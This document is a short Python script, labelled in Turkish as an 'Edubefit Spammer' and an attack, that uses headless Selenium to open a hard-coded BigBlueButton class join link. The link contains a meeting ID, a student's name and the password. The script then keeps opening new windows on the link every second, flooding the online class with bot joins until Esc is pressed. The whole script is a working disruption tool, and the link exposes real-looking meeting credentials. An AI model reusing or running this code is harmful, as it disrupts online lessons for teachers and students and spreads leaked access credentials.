from selenium import webdriver
from art import *
import hl.colours as k
import datetime,msvcrt,time

tprint("furkank",font="block",chr_ignore=True)
print(k.yellow("Edubefit Spammer"))
print(k.green("Sistem Başlatılıyor"))
options = webdriver.ChromeOptions()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('window-size=1920x1080')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--mute-audio")
options.add_argument("--incognito")
options.add_argument("--log-level=3")
options.add_experimental_option('excludeSwitches', ['enable-logging'])
browser = webdriver.Chrome(options=options)
browser.set_page_load_timeout(99999)
golink = "https://scale01.edubefit.com/bigbluebutton/api/join?meetingID=2f3f3ea9-91ab-4cb4-a8c8-d9b5777ed08f&fullName=Furkan+Kamilo%C4%9Flu&password=ogr2020&redirect=true&joinViaHtml5=true&checksum=3589b1d23fa114deb572a535466c249c4d258244"
browser.get(golink)
print(k.red("Saldırı Başladı Durdurmak İçin esc'ye Basın"))

allsent = 1
while True:
    browser.execute_script("window.open('"+ golink+"')")
    allsent += 1
    print(k.red("Spam Gönderildi - " + str(allsent)))
    time.sleep(1)
    if msvcrt.kbhit():
        if ord(msvcrt.getch()) == 27:
            break

input("Bot Atmayı Durdurdum Bir Tuşa Bas Ve Botları Kapat")
browser.quit()



